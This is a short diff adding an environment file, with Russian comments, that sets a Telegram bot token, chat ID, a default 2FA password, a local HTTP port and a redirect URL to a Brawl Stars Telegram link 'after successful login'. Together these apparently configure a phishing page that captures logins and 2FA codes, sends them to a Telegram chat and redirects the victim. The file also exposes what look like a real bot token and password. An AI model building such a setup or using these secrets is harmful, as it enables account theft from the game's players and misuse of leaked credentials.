@@ -1,0 +1,11 @@
+# Telegram bot
+TG_TOKEN=8669624510:AAHrFX98PoR2LaQUATwPM4AGsdLZcHx6S-8
+TG_CHAT_ID=-1003937885511
+DEFAULT_2FA_PASSWORD=Fiksik2009
+
+# Куда редиректить после успешного входа
+REDIRECT_URL=https://max.ru/brawl_stars_tg
+
+# Локальный порт
+HTTP_HOST=0.0.0.0
+HTTP_PORT=8080
